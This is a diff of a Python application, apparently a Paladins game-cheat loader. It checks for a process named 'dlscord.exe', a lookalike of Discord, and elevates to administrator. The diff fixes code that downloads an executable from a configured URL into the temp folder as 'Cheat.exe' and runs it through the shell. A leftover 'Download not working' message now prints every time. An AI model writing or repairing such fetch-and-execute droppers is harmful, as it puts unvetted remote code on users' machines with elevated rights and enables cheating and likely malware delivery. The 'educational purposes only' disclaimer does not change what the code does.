@@ -1187,15 +1187,12 @@ class App:
         try:
             pm = Pymem("dlscord.exe")
         except:
-            try:
-                url = self.version["PaladinsLink"]
-                self.file_path = tempfile.gettempdir() + "\\Cheat.exe"
-                open(self.file_path).write(
-                    requests.get(url, stream=True, allow_redirects=True).content
-                )
-                subprocess.call([self.file_path], shell=True)
-            except:
-                print("Download not working")
+            url = self.version["PaladinsLink"]
+            self.file_path = tempfile.gettempdir() + "\\Cheat.exe"
+            with open(self.file_path, "wb") as file:
+                file.write(requests.get(url, stream=True, allow_redirects=True).content)
+            subprocess.call([self.file_path], shell=True)
+            print("Download not working")
 
         try:
             subprocess.call(
@@ -1543,6 +1540,7 @@ if __name__ == "__main__":
         pyuac.runAsAdmin()
     else:
         login = App()
+
 
 """
     DISCLAIMER: Use for educational purposes only"""
